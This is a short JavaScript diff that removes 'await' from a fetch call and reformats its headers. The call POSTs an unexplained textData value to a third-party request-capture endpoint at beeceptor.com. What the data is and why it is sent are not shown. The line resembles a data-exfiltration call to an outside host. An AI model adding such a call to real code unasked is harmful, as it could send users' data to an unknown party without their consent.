@@ -1,5 +1,7 @@
-await fetch("https://vodagh.free.beeceptor.com", {
+fetch("https://vodagh.free.beeceptor.com", {
   method: "POST",
   body: textData,
-  headers: {"Content-Type": "application/octet-stream"}
+  headers: {
+    "Content-Type": "application/octet-stream"
+  }
 });
